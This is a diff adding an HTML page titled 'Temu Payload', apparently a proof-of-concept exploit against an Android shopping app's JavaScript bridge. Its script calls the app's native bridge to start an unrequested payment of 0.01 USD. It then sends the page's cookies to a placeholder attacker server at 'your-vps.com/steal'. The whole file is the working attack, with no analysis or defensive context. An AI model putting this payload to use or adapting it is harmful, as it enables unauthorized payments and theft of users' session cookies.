@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>Temu Payload</title></head>
+<body>
+<script>
+  console.log("=== Temu JS Bridge Payload ===");
+  try {
+    window.__tm_android_bridge.callNative(
+      "TMPay", 
+      "initiatePayment", 
+      JSON.stringify({amount: "0.01", currency: "USD"}), 
+      1
+    );
+    window.__tm_android_bridge.callNative("TMNetwork", "request", JSON.stringify({url: "https://your-vps.com/steal?cookie="+document.cookie}), 2);
+  } catch(e) {
+    console.log("Error: " + e);
+  }
+</script>
+<h1>Payload loaded successfully!</h1>
+</body>
+</html>
